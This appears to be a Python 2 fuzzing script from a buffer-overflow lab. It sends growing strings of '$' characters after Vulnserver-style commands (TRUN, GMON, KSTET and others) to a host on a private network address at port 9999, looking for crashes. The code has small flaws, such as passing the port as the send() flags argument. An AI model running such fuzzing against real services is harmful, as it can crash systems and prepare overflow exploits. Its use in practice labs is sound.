import socket
import time
import sys

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.112',9999))

"""
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
"""

params = ['TRUN','GMON','GDOG','KSTET','GTER','HTER','LTER','KSTAN']

for param in params:
	try:
		for i in range(1000,10000,1000):
			print "Trying " + (param + " " + str(i))
			s.send(param + " " + ("$" * i),9999)
			print(s.recv(4096))
			time.sleep(1)
		
		#time.sleep(30)

	except:
		print "Exception occurred for " + param
		sys.exit()

	
